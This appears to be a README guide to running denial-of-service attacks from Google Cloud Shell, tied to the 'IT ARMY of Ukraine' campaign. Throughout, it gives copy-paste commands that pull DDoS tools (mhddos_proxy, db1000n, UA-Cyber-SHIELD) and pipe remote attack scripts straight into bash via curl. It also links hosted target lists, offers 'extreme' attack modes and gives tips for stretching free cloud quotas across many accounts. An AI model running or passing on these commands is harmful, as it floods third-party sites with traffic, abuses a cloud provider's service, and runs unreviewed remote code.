## [DDoS whith Google Cloud Shell](https://sites.google.com/view/operationrussia/googleshell)
#### Scripts for durable cloudshell session. Test!
#
### Use https://shell.cloud.google.com/?fromcloudshell=true&show=terminal
### from PC and smartphones (*all devices with browser*;)
#
#### Browser mode (*suitable for use 1 to 20-30 accounts from one PC, if more - [here](https://github.com/Operation-Stop-russia/Gcloudshell_ddos/tree/main/GShellSDK#readme)*)
:exclamation:• **It is recommended to use 1 terminal per account**.    
:exclamation:• **GShell sessions are capped at 12 hours. You can start a new session immediately after terminate**    
:exclamation:• Please note that **Weekly usage quotas, 1 account - 50 hours in normal mode and up to 50 hours in ephemeral mode** (*until the quota expires in the default mode - turn on the ephemeral mode (set - "Always") and get 10-50 hours of use during the current week*)    
:exclamation:• In [Google Cloud Shell](https://shell.cloud.google.com/?fromcloudshell=true&show=terminal) you can disable usage statistics in settings.    
• **To restore Cloud Shell** - remove all files from your home directory, command: `sudo rm -rf $HOME`, after - in the Cloud Shell menu, click the three dots menu icon, then click "Restart" *(A new VM will be provisioned and the home directory will be restored to its default state)*
#
### Stable sessions (*90%*)
:white_check_mark:**Command to install and run mhddos_proxy** (*Docker*):
```
sudo docker run -it --rm  --cpus="0.7" --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:old -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 3000 --vpn 1 --http-methods GET --rpc 500
```
:white_check_mark:**Command to install and run mhddos_proxy** (Bash):
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
```
:white_check_mark:**Command to install and run db1000n** (*Docker*):
```
sudo docker run -it --rm  --cpus="0.5" --rm -it --pull always ghcr.io/arriven/db1000n
```
:white_check_mark: **Command to install and run db1000n** (Bash):
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/db1000n_GShell.sh | bash
``` 
:white_check_mark:**Command to install and run UA-Cyber-SHIELD** (*Docker*):
```
sudo docker run -it --rm  --cpus="0.5" ghcr.io/opengs/uashield:master --workers=256 --withProxy=true
```
:white_check_mark:**Command to install and run mhddos_proxy** *using only proxies*  (Bash):
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m-proxy_only.sh | bash
```
#
#
### Tests / elaborations / experiments. 
**Unstable sessions; are terminated** (need constantly checked)      
  
:grey_question:**Layer4:**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4_tcp.sh | bash
```
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L4.sh | bash    
```
:grey_question:**All targets:**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/ALL.sh | bash
```
:grey_question:***--itarmy*:**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/itarmy.sh | bash
```
:grey_question:**Split terminal (Layer7+Layer4):**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash
```    
#
### EXTREME MODE:zap:NoLimits (mhddos_proxy commands without parameters)
 :exclamation: **Attacks are powerful but short + high probability of getting banned** (*the ban is usually temporary and only applies to access to GShell*)    
  
:zap:***--itarmy*:**
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/X/itarmyX.sh | bash
```
:zap:**Layer4:**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/X/tcpX.sh | bash
```
:zap:**All targets:**    
```
curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/X/ALLx.sh | bash
```
#
#
#### Target lists
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst    
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4_tcp.lst    
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/AllTargets.lst     
#
#
[IT ARMY of Ukraine](https://t.me/itarmyofukraine2022)
